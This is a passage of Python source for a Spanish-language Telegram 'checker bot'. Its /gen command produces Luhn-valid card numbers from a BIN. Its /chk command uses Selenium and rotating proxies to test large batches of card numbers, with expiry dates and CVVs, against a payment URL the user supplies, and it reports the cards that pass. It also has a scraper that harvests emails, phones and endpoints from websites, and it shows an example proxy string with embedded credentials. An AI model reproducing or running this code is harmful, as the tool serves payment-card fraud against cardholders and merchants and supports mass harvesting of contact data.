                enviar_telegram(msg_valida, reply_markup=reply_markup)
                # Al encontrar la válida, se detiene el lote
                break
            else:
                msg_invalid = (
                    f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                    f"❌ <b><code>║            ESTADO: INVALID            ║</code></b>\n"
                    f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                    f"💳 <b><code>TARJETA:</code></b>\n"
                    f"<code>{html.escape(card_str)}</code>\n\n"
                    f"⚠️ <b><code>MOTIVO:</code></b> <b><code>{html.escape(detalle or 'Autenticación fallida')}</code></b>"
                )
                enviar_telegram(msg_invalid)

            if idx < total and not stop_event.is_set():
                time.sleep(1.0)
        else:
            enviar_telegram(
                f"🏁 <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🏁 <b><code>║       PROCESO FINALIZADO              ║</code></b>\n"
                f"🏁 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"✅ <b><code>Todas las tarjetas han sido comprobadas.</code></b>"
            )

    except Exception as e:
        registrar_log(1, "", "ERROR", f"Error general en hilo de chequeo: {e}")
        enviar_telegram(
            f"⚠️ <b><code>[ERROR CRÍTICO] {html.escape(str(e))}</code></b>"
        )
    finally:
        if driver:
            cerrar_driver_seguro(driver, 1)
        active_jobs.pop(user_id, None)

# =====================================================================
# SCRAPPER DE LEADS WEB
# =====================================================================

def extraer_leads_de_texto(texto: str, html_content: str = "") -> dict:
    """Extrae emails, teléfonos y enlaces de contacto/redes de un texto o código HTML."""
    combined = (texto or "") + " \n " + (html_content or "")

    emails = sorted(list(set(re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', combined))))
    social = sorted(list(set(re.findall(r'https?://(?:wa\.me|api\.whatsapp\.com|t\.me|instagram\.com|twitter\.com|x\.com)/[a-zA-Z0-9_.-]+', combined))))

    candidatos = re.findall(r'(?:\+?34[\s.-]?)?[6789]\d{2}[\s.-]?\d{3}[\s.-]?\d{3}', texto or "")
    candidatos += re.findall(r'\+\d{1,3}[\s.-]?\d{2,4}[\s.-]?\d{3,4}[\s.-]?\d{3,4}', texto or "")

    phones = []
    for tel in set(candidatos):
        digits = re.sub(r'\D', '', tel)
        if 9 <= len(digits) <= 15:
            phones.append(tel.strip())
    phones.sort()

    return {
        'emails': emails,
        'phones': phones,
        'social': social,
        'total': len(emails) + len(phones) + len(social)
    }

def scrapear_leads_url(url: str, proxy_info: Optional[dict] = None) -> dict:
    """Extrae leads y endpoints de la URL usando el scraper multipaso con reintentos y fallback a Selenium."""
    proxy_str = None
    if proxy_info:
        u = proxy_info.get("user")
        p = proxy_info.get("password")
        h = proxy_info.get("host")
        port = proxy_info.get("port")
        sch = proxy_info.get("scheme", "http")
        if u and p:
            proxy_str = f"{sch}://{u}:{p}@{h}:{port}"
        elif h and port:
            proxy_str = f"{sch}://{h}:{port}"

    try:
        resultado = run_scraper(url, proxy=proxy_str)
        return {
            'emails': resultado.get('emails', []),
            'phones': resultado.get('phones', []),
            'social': resultado.get('social', []),
            'endpoints': resultado.get('endpoints', []),
            'files': resultado.get('files', {}),
            'total': len(resultado.get('emails', [])) + len(resultado.get('phones', [])) + len(resultado.get('social', [])),
        }
    except Exception as e:
        registrar_log(1, "", "WARN", f"Scraper avanzado falló ({e}), activando fallback con Selenium...")

    driver = None
    try:
        driver = crear_driver(es_headless=True, proxy_info=proxy_info)
        driver.get(url)
        time.sleep(2.5)

        texto_visible = extraer_textos_pagina(driver)
        codigo_fuente = ""
        try:
            codigo_fuente = driver.page_source
        except Exception:
            pass

        leads = extraer_leads_de_texto(texto_visible, codigo_fuente)
        leads['endpoints'] = []
        leads['files'] = {}
        return leads
    finally:
        if driver:
            cerrar_driver_seguro(driver, 1)


def obtener_teclado_inicio(user_id: int) -> InlineKeyboardMarkup:
    """Genera el teclado dinámico del panel de inicio con proxies y scrapper."""
    proxy_activo = user_manager.get_proxy(user_id)
    if proxy_activo:
        btn_proxy = InlineKeyboardButton("🗑️ Quitar Proxies", callback_data="btn_delete_proxy")
    else:
        btn_proxy = InlineKeyboardButton("🛡️ Proxies", callback_data="btn_config_proxy")

    keyboard = [
        [btn_proxy],
        [InlineKeyboardButton("🔍 Scrapper", callback_data="btn_scrapper_leads")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def enviar_panel_inicio(chat_id: int, user_id: int, context: ContextTypes.DEFAULT_TYPE, prefijo_msg: str = ""):
    """Envía el panel principal con el teclado interactivo actualizado."""
    proxy_activo = user_manager.get_proxy(user_id)
    tag_proxy = f"ACTIVADO ({proxy_activo['host']})" if proxy_activo else "DESACTIVADO (Directo)"

    cuerpo = (
        f"{prefijo_msg}\n\n" if prefijo_msg else ""
    ) + (
        f"🤖 <b><code>╔════════════════════════════════════════╗</code></b>\n"
        f"🤖 <b><code>║            PANEL DE CONTROL           ║</code></b>\n"
        f"🤖 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
        f"🛡️ <b><code>ESTADO DEL PROXY: {tag_proxy}</code></b>\n"
        f"⚙️ <b><code>Selecciona una función a continuación:</code></b>"
    )
    reply_markup = obtener_teclado_inicio(user_id)
    await context.bot.send_message(
        chat_id=chat_id,
        text=cuerpo,
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def procesar_scrape_url(chat_id: int, user_id: int, url: str, context: ContextTypes.DEFAULT_TYPE):
    """Realiza el escaneo y reconocimiento de la URL, devolviendo leads, endpoints y archivos CSV."""
    url = url.strip()
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url

    proxy_info = user_manager.get_proxy(user_id)
    proxy_desc = f"{proxy_info['host']}:{proxy_info['port']}" if proxy_info else "Directo (Sin proxy)"

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"🔍 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🔍 <b><code>║        INICIANDO RECON & SCRAPING      ║</code></b>\n"
            f"🔍 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"🌐 <b><code>URL OBJETIVO:</code></b>\n"
            f"<code>{html.escape(url)}</code>\n\n"
            f"🛡️ <b><code>CONEXIÓN:</code></b> <b><code>{html.escape(proxy_desc)}</code></b>\n"
            f"⏳ <b><code>Fase 1: Escaneo de rutas y endpoints...</code></b>\n"
            f"⚡ <b><code>Fase 2: Búsqueda de APIs en JavaScript...</code></b>\n"
            f"📄 <b><code>Fase 3: Paginación estructurada (urlencode)...</code></b>\n"
            f"🎯 <b><code>Fase 4: Extracción de leads y guardado de CSVs...</code></b>"
        ),
        parse_mode="HTML"
    )

    try:
        leads = await asyncio.to_thread(scrapear_leads_url, url, proxy_info)
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"❌ <b><code>║         ERROR AL SCRAPEAR URL         ║</code></b>\n"
                f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"⚠️ <code>{html.escape(str(e))}</code>"
            ),
            parse_mode="HTML"
        )
        await enviar_panel_inicio(chat_id, user_id, context)
        return

    emails = leads.get('emails', [])
    phones = leads.get('phones', [])
    social = leads.get('social', [])
    endpoints = leads.get('endpoints', [])
    files = leads.get('files', {})
    total = leads.get('total', len(emails) + len(phones) + len(social))

    def formatear_lista(items, placeholder):
        if not items:
            return f"  ▫️ <i><code>{placeholder}</code></i>"
        visibles = items[:8]
        res = "\n".join([f"  ▫️ <code>{html.escape(x)}</code>" for x in visibles])
        if len(items) > 8:
            res += f"\n  ▫️ <i><code>... y {len(items)-8} más en los archivos adjuntos</code></i>"
        return res

    txt_emails = formatear_lista(emails, "No se detectaron correos")
    txt_phones = formatear_lista(phones, "No se detectaron teléfonos")
    txt_social = formatear_lista(social, "No se detectaron redes / mensajería")

    msg_leads = (
        f"🎯 <b><code>╔════════════════════════════════════════╗</code></b>\n"
        f"🎯 <b><code>║     REPORTE DE SCRAPING DE LEADS      ║</code></b>\n"
        f"🎯 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
        f"🌐 <b><code>URL:</code></b> <code>{html.escape(url)}</code>\n"
        f"📡 <b><code>ENDPOINTS DETECTADOS:</code></b> <b><code>{len(endpoints)}</code></b>\n"
        f"📊 <b><code>TOTAL LEADS ENCONTRADOS:</code></b> <b><code>{total}</code></b>\n\n"
        f"📧 <b><code>CORREOS ELECTRÓNICOS ({len(emails)}):</code></b>\n"
        f"{txt_emails}\n\n"
        f"📞 <b><code>TELÉFONOS DETECTADOS ({len(phones)}):</code></b>\n"
        f"{txt_phones}\n\n"
        f"🔗 <b><code>REDES / CONTACTO DIRECTO ({len(social)}):</code></b>\n"
        f"{txt_social}\n\n"
        f"📁 <b><code>Enviando archivos generados a continuación...</code></b>"
    )

    await context.bot.send_message(chat_id=chat_id, text=msg_leads, parse_mode="HTML")

    reply_markup = obtener_teclado_inicio(user_id)

    # Enviar archivos generados si existen
    leads_csv = files.get("leads_csv")
    endpoints_csv = files.get("endpoints_csv")
    summary_txt = files.get("summary_txt")

    if leads_csv and os.path.exists(leads_csv):
        try:
            with open(leads_csv, "rb") as fp_leads:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=fp_leads,
                    filename=os.path.basename(leads_csv),
                    caption="📊 <b><code>Archivo de Leads CSV (Emails, Teléfonos, Redes)</code></b>",
                    parse_mode="HTML"
                )
        except Exception as e:
            registrar_log(1, "", "WARN", f"Error enviando leads CSV: {e}")

    if endpoints_csv and os.path.exists(endpoints_csv):
        try:
            with open(endpoints_csv, "rb") as fp_ep:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=fp_ep,
                    filename=os.path.basename(endpoints_csv),
                    caption=f"📡 <b><code>Endpoints y Rutas CSV ({len(endpoints)} descubiertos)</code></b>",
                    parse_mode="HTML"
                )
        except Exception as e:
            registrar_log(1, "", "WARN", f"Error enviando endpoints CSV: {e}")

    if summary_txt and os.path.exists(summary_txt):
        try:
            with open(summary_txt, "rb") as fp_sum:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=fp_sum,
                    filename=os.path.basename(summary_txt),
                    caption="📑 <b><code>Resumen consolidado en formato de texto</code></b>",
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
                return
        except Exception as e:
            registrar_log(1, "", "WARN", f"Error enviando summary TXT: {e}")

    # Fallback si no hay archivos en disco
    fecha_actual = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lineas_txt = [
        f"============================================================",
        f" REPORTE DE LEADS EXTRAÍDOS // SCRAPPER BOT",
        f" URL: {url}",
        f" Fecha: {fecha_actual}",
        f" Total Leads: {total}",
        f"============================================================",
        "",
        "--- CORREOS ELECTRÓNICOS ---"
    ]
    lineas_txt.extend(emails if emails else ["Ninguno"])
    lineas_txt.append("")
    lineas_txt.append("--- TELÉFONOS ---")
    lineas_txt.extend(phones if phones else ["Ninguno"])
    lineas_txt.append("")
    lineas_txt.append("--- REDES / CONTACTO ---")
    lineas_txt.extend(social if social else ["Ninguno"])
    lineas_txt.append("")

    bio = io.BytesIO("\n".join(lineas_txt).encode("utf-8"))
    bio.name = "leads.txt"

    await context.bot.send_document(
        chat_id=chat_id,
        document=bio,
        filename="leads.txt",
        caption=(
            f"📁 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"📁 <b><code>║        ARCHIVO: leads.txt             ║</code></b>\n"
            f"📁 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"📊 <b><code>LEADS EXTRAÍDOS:</code></b> <b><code>{total}</code></b>\n"
            f"⚡ <b><code>Descarga el archivo para exportar la base de datos.</code></b>"
        ),
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def cmd_scrape(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /scrape:
    - /scrape <url>: Extrae leads de la web indicada.
    - /scrape: Pide interactivamente la URL a scrapear.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    args = context.args

    if args:
        url = " ".join(args).strip()
        await procesar_scrape_url(chat_id, user_id, url, context)
    else:
        user_conversations[user_id] = {'step': 'AWAITING_SCRAPE_URL'}
        await update.message.reply_text(
            f"🔍 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🔍 <b><code>║        SCRAPPER // EXTRACCIÓN LEADS   ║</code></b>\n"
            f"🔍 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"📝 <b><code>Por favor, envía la URL que deseas scrapear:</code></b>\n"
            f"<code>https://ejemplo.com/contacto</code>\n\n"
            f"⚡ <b><code>El sistema extraerá correos, teléfonos y redes de contacto usando tu proxy.</code></b>",
            parse_mode="HTML"
        )

# =====================================================================
# HANDLERS DE COMANDOS DE TELEGRAM
# =====================================================================

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start y bienvenida."""
    user = update.effective_user
    user_id = user.id if user else 0
    nombre = user.first_name.upper() if user and user.first_name else "USUARIO"

    proxy_activo = user_manager.get_proxy(user_id)
    tag_proxy = f"ACTIVADO ({proxy_activo['host']})" if proxy_activo else "DESACTIVADO (Directo)"

    msg = (
        f"🤖 <b><code>╔════════════════════════════════════════╗</code></b>\n"
        f"🤖 <b><code>║   SISTEMA AUTOFILL // CHECKER BOT     ║</code></b>\n"
        f"🤖 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
        f"👋 <b><code>BIENVENIDO, {html.escape(nombre)}</code></b>\n\n"
        f"⚡ <b><code>COMANDOS DEL SISTEMA:</code></b>\n"
        f"▫️ <b><code>/chk</code></b> ➔ <b><code>Iniciar chequeo (+100 tarjetas sin límite)</code></b>\n"
        f"▫️ <b><code>/chk &lt;tarjetas&gt;</code></b> ➔ <b><code>Chequeo rápido directo</code></b>\n"
        f"▫️ <b><code>/gen &lt;10_dígitos&gt;</code></b> ➔ <b><code>Generar 30 tarjetas aleatorias</code></b>\n"
        f"▫️ <b><code>/valid</code></b> ➔ <b><code>Descargar todas las válidas en .txt</code></b>\n"
        f"▫️ <b><code>/proxy</code></b> ➔ <b><code>Configurar proxy DataImpulse / HTTP</code></b>\n"
        f"▫️ <b><code>/scrape &lt;url&gt;</code></b> ➔ <b><code>Extraer leads y contactos de una web</code></b>\n"
        f"▫️ <b><code>/url &lt;enlace&gt;</code></b> ➔ <b><code>Guardar o cambiar tu URL</code></b>\n"
        f"▫️ <b><code>/url</code></b> ➔ <b><code>Consultar tu URL configurada</code></b>\n"
        f"▫️ <b><code>/stop</code></b> ➔ <b><code>Detener el chequeo en curso</code></b>\n\n"
        f"🛡️ <b><code>ESTADO DEL PROXY: {tag_proxy}</code></b>\n"
        f"⚙️ <b><code>ESTADO: SISTEMA EN LÍNEA Y OPERATIVO</code></b>"
    )
    reply_markup = obtener_teclado_inicio(user_id)
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)

async def cmd_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /url:
    - /url <enlace>: cambia la URL guardada del usuario independiente
    - /url: muestra la URL actual guardada
    """
    user_id = update.effective_user.id
    args = context.args

    if args:
        nueva_url = " ".join(args).strip()
        if not (nueva_url.startswith("http://") or nueva_url.startswith("https://")):
            nueva_url = "https://" + nueva_url

        user_manager.set_url(user_id, nueva_url)
        await update.message.reply_text(
            f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"✅ <b><code>║     URL ACTUALIZADA CON ÉXITO         ║</code></b>\n"
            f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"🔗 <b><code>NUEVA URL:</code></b>\n"
            f"<code>{html.escape(nueva_url)}</code>\n\n"
            f"⚡ <b><code>Se usará automáticamente en tus próximos /chk.</code></b>",
            parse_mode="HTML"
        )
    else:
        url_actual = user_manager.get_url(user_id)
        if url_actual:
            await update.message.reply_text(
                f"📌 <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"📌 <b><code>║        URL CONFIGURADA ACTUAL          ║</code></b>\n"
                f"📌 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"🔗 <b><code>URL ASIGNADA:</code></b>\n"
                f"<code>{html.escape(url_actual)}</code>\n\n"
                f"💡 <b><code>Para cambiarla por otra, escribe:</code></b>\n"
                f"<b><code>/url &lt;nueva_url&gt;</code></b>",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(
                f"⚠️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"⚠️ <b><code>║        SIN URL CONFIGURADA            ║</code></b>\n"
                f"⚠️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"ℹ️ <b><code>No tienes ninguna URL guardada todavía.</code></b>\n\n"
                f"💡 <b><code>Para configurar una, escribe:</code></b>\n"
                f"<b><code>/url &lt;tu_url&gt;</code></b>",
                parse_mode="HTML"
            )

async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /proxy:
    - /proxy <proxy_str>: Configura el proxy directamente.
    - /proxy: Muestra el proxy actual o pide configurarlo.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    args = context.args

    if args:
        proxy_str = " ".join(args).strip()
        proxy_info = parsear_proxy(proxy_str)
        if not proxy_info:
            await update.message.reply_text(
                f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"❌ <b><code>║       FORMATO DE PROXY INVÁLIDO       ║</code></b>\n"
                f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"💡 <b><code>Ejemplo:</code></b>\n"
                f"<code>/proxy curl -x http://user:pass@gw.dataimpulse.com:823</code>",
                parse_mode="HTML"
            )
            return

        user_manager.set_proxy(user_id, proxy_info)
        auth_desc = "Sí (Usuario y Contraseña)" if proxy_info.get("user") else "Sin autenticación"
        await update.message.reply_text(
            f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"✅ <b><code>║     PROXY CONFIGURADO CON ÉXITO       ║</code></b>\n"
            f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"🌐 <b><code>SERVIDOR:</code></b> <code>{html.escape(proxy_info['host'])}:{html.escape(proxy_info['port'])}</code>\n"
            f"👤 <b><code>USUARIO:</code></b> <code>{html.escape(proxy_info['user'] or 'N/A')}</code>\n"
            f"🔒 <b><code>AUTENTICACIÓN:</code></b> <b><code>{auth_desc}</code></b>\n"
            f"⚡ <b><code>Listo para tus próximos /chk y scrapeos.</code></b>",
            parse_mode="HTML"
        )
        await enviar_panel_inicio(chat_id, user_id, context)
    else:
        proxy_actual = user_manager.get_proxy(user_id)
        keyboard = [
            [
                InlineKeyboardButton("🛡️ Configurar / Cambiar Proxy", callback_data="btn_config_proxy")
            ]
        ]
        if proxy_actual:
            keyboard.append([InlineKeyboardButton("🗑️ Eliminar Proxy", callback_data="btn_delete_proxy")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        if proxy_actual:
            await update.message.reply_text(
                f"🛡️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🛡️ <b><code>║        PROXY ACTUAL CONFIGURADO        ║</code></b>\n"
                f"🛡️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"🌐 <b><code>SERVIDOR:</code></b> <code>{html.escape(proxy_actual['host'])}:{html.escape(proxy_actual['port'])}</code>\n"
                f"👤 <b><code>USUARIO:</code></b> <code>{html.escape(proxy_actual['user'] or 'N/A')}</code>\n"
                f"🛡️ <b><code>TIPO:</code></b> <b><code>{proxy_actual.get('scheme', 'http').upper()}</code></b>\n\n"
                f"💡 <b><code>Para cambiarlo o eliminarlo, pulsa los botones de abajo:</code></b>",
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        else:
            user_conversations[user_id] = {'step': 'AWAITING_PROXY'}
            await update.message.reply_text(
                f"🛡️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🛡️ <b><code>║       CONFIGURACIÓN DE PROXIES        ║</code></b>\n"
                f"🛡️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"ℹ️ <b><code>No tienes ningún proxy configurado actualmente.</code></b>\n\n"
                f"📝 <b><code>Envía tu proxy de DataImpulse o HTTP:</code></b>\n"
                f"<code>curl -x http://usuario:password@gw.dataimpulse.com:823</code>",
                parse_mode="HTML"
            )

async def iniciar_chequeo_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, chat_id: int, url: str, tarjetas: List[Tuple[str, str, str]]):
    """Inicia el trabajo de chequeo en segundo plano sin límite estricto de tarjetas."""
    if user_id in active_jobs:
        await context.bot.send_message(
            chat_id=chat_id,
            text="⏳ <b><code>[AVISO] Ya tienes un chequeo activo. Usa /stop si deseas cancelarlo.</code></b>",
            parse_mode="HTML"
        )
        return

    if not tarjetas:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ <b><code>[ERROR] No se proporcionaron tarjetas válidas para chequear.</code></b>",
            parse_mode="HTML"
        )
        return

    stop_event = threading.Event()
    active_jobs[user_id] = {
        'stop_event': stop_event,
        'driver': None,
        'running': True
    }

    loop = asyncio.get_running_loop()
    threading.Thread(
        target=ejecutar_proceso_chequeo,
        args=(chat_id, user_id, url, tarjetas, context.application, loop),
        daemon=True
    ).start()

async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /gen:
    - /gen <10_caracteres>: Genera 30 tarjetas aleatorias con algoritmo Luhn a partir de esos 10 dígitos.
    - /gen: Pide interactivamente los 10 dígitos si no se pasaron como argumento.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    args = context.args

    if args:
        texto_args = "".join(args).strip()
        prefix = re.sub(r"\D", "", texto_args)

        if len(prefix) < 10:
            await update.message.reply_text(
                f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"❌ <b><code>║       DÍGITOS INSUFICIENTES (MÍN 10)   ║</code></b>\n"
                f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"⚠️ <b><code>Has indicado:</code></b> <code>{html.escape(texto_args)}</code> ({len(prefix)} dígitos)\n"
                f"📝 <b><code>Debes proporcionar al menos 10 dígitos numéricos.</code></b>\n\n"
                f"💡 <b><code>Ejemplo:</code></b> <b><code>/gen 4150070033</code></b>",
                parse_mode="HTML"
            )
            return

        prefix_10 = prefix[:10]
        cards_30 = generar_30_tarjetas(prefix_10)
        texto_cards = "\n".join(cards_30)

        keyboard = [
            [
                InlineKeyboardButton("⚡ Generar otras 30", callback_data=f"btn_gen_{prefix_10}"),
                InlineKeyboardButton("🌐 Nueva URL", callback_data="btn_nueva_url")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        msg_gen = (
            f"🎲 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🎲 <b><code>║        GENERADOR: 30 TARJETAS         ║</code></b>\n"
            f"🎲 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"📌 <b><code>PREFIJO BASE (10 DÍGITOS):</code></b> <b><code>{html.escape(prefix_10)}</code></b>\n"
            f"📊 <b><code>TOTAL GENERADAS:</code></b> <b><code>30 unidades</code></b>\n\n"
            f"<pre><code>{texto_cards}</code></pre>\n\n"
            f"💡 <b><code>Toca el bloque de código para copiarlo al portapapeles.</code></b>"
        )
        await update.message.reply_text(msg_gen, parse_mode="HTML", reply_markup=reply_markup)
    else:
        user_conversations[user_id] = {'step': 'AWAITING_GEN_BIN'}
        await update.message.reply_text(
            f"🎲 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🎲 <b><code>║       GENERADOR DE 30 TARJETAS        ║</code></b>\n"
            f"🎲 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"🔢 <b><code>Por favor, introduce los 10 primeros caracteres (BIN):</code></b>\n"
            f"<code>4150070033</code>\n\n"
            f"⚡ <b><code>El sistema generará 30 tarjetas aleatorias con algoritmo Luhn.</code></b>",
            parse_mode="HTML"
        )

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /chk:
    - Pide las tarjetas al usuario (+100 tarjetas admitidas con formato NUMERO|MM|AA|CVV).
    - O toma las tarjetas directamente si se adjuntan a /chk.
    - Luego gestiona la URL guardada o pide la URL.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_id in active_jobs:
        await update.message.reply_text(
            "⏳ <b><code>[AVISO] Ya tienes un chequeo en ejecución. Puedes detenerlo con /stop.</code></b>",
            parse_mode="HTML"
        )
        return

    # Si se pasaron tarjetas en el mismo comando (/chk 4150...)
    texto_args = " ".join(context.args) if context.args else ""
    tarjetas = parsear_tarjetas_texto(texto_args) if texto_args else []

    if tarjetas:
        saved_url = user_manager.get_url(user_id)
        if saved_url:
            await update.message.reply_text(
                f"🔍 <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🔍 <b><code>║      INICIANDO CHEQUEO RÁPIDO         ║</code></b>\n"
                f"🔍 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"🌐 <b><code>URL GUARDADA:</code></b>\n"
                f"<code>{html.escape(saved_url)}</code>\n\n"
                f"📊 <b><code>Tarjetas a procesar:</code></b> <b><code>{len(tarjetas)}</code></b>\n"
                f"⏳ <b><code>Iniciando motor de automatización...</code></b>",
                parse_mode="HTML"
            )
            await iniciar_chequeo_usuario(update, context, user_id, chat_id, saved_url, tarjetas)
        else:
            user_conversations[user_id] = {
                'step': 'AWAITING_URL',
                'pending_cards': tarjetas
            }
            await update.message.reply_text(
                f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"✅ <b><code>║    TARJETAS RECIBIDAS: {len(tarjetas):<14} ║</code></b>\n"
                f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"🌐 <b><code>Por favor, introduce la URL de pago para el chequeo:</code></b>",
                parse_mode="HTML"
            )
    else:
        # No se pasaron tarjetas: pedirlas interactivamente
        user_conversations[user_id] = {
            'step': 'AWAITING_CARDS',
            'pending_cards': []
        }
        await update.message.reply_text(
            f"💳 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"💳 <b><code>║       INTRODUCE LAS TARJETAS          ║</code></b>\n"
            f"💳 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"📝 <b><code>Envía las tarjetas (una por línea o en lote de +100):</code></b>\n"
            f"<code>4150070033612022|03|29|458</code>",
            parse_mode="HTML"
        )

async def manejar_mensaje_texto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja mensajes de texto cuando el bot está esperando tarjetas o la URL."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    texto = update.message.text.strip() if update.message.text else ""

    conv = user_conversations.get(user_id)
    if not conv:
        return

    paso = conv.get('step')

    # NUEVO PASO: Cuando el usuario usó /gen sin argumentos y envía los 10 dígitos
    if paso == 'AWAITING_GEN_BIN':
        prefix = re.sub(r"\D", "", texto)
        if len(prefix) < 10:
            await update.message.reply_text(
                f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"❌ <b><code>║       DÍGITOS INSUFICIENTES (MÍN 10)   ║</code></b>\n"
                f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"⚠️ <b><code>Has enviado:</code></b> <code>{html.escape(texto)}</code> ({len(prefix)} dígitos)\n"
                f"📝 <b><code>Por favor, envía al menos 10 dígitos numéricos:</code></b>\n"
                f"<code>4150070033</code>",
                parse_mode="HTML"
            )
            return

        user_conversations.pop(user_id, None)
        prefix_10 = prefix[:10]
        cards_30 = generar_30_tarjetas(prefix_10)
        texto_cards = "\n".join(cards_30)

        keyboard = [
            [
                InlineKeyboardButton("⚡ Generar otras 30", callback_data=f"btn_gen_{prefix_10}"),
                InlineKeyboardButton("🌐 Nueva URL", callback_data="btn_nueva_url")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        msg_gen = (
            f"🎲 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🎲 <b><code>║        GENERADOR: 30 TARJETAS         ║</code></b>\n"
            f"🎲 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"📌 <b><code>PREFIJO BASE (10 DÍGITOS):</code></b> <b><code>{html.escape(prefix_10)}</code></b>\n"
            f"📊 <b><code>TOTAL GENERADAS:</code></b> <b><code>30 unidades</code></b>\n\n"
            f"<pre><code>{texto_cards}</code></pre>\n\n"
            f"💡 <b><code>Toca el bloque de código para copiarlo al portapapeles.</code></b>"
        )
        await update.message.reply_text(msg_gen, parse_mode="HTML", reply_markup=reply_markup)
        return

    # NUEVO PASO: Cuando el usuario presionó 'Proxies' o /proxy y envía la cadena de proxy
    if paso == 'AWAITING_PROXY':
        proxy_info = parsear_proxy(texto)
        if not proxy_info:
            await update.message.reply_text(
                f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"❌ <b><code>║       FORMATO DE PROXY INVÁLIDO       ║</code></b>\n"
                f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"⚠️ <b><code>No se pudo extraer host y puerto del texto enviado.</code></b>\n\n"
                f"💡 <b><code>Ejemplo admitido (puedes pegar el curl de DataImpulse tal cual):</code></b>\n"
                f"<code>curl -x http://9a6dc7641e60bd9ad507:242b4b6ca788f743@gw.dataimpulse.com:823</code>",
                parse_mode="HTML"
            )
            return

        user_manager.set_proxy(user_id, proxy_info)
        user_conversations.pop(user_id, None)

        tiene_auth = "Sí (Usuario y Contraseña)" if proxy_info.get("user") else "Sin autenticación"
        await update.message.reply_text(
            f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"✅ <b><code>║     PROXY CONFIGURADO CON ÉXITO       ║</code></b>\n"
            f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
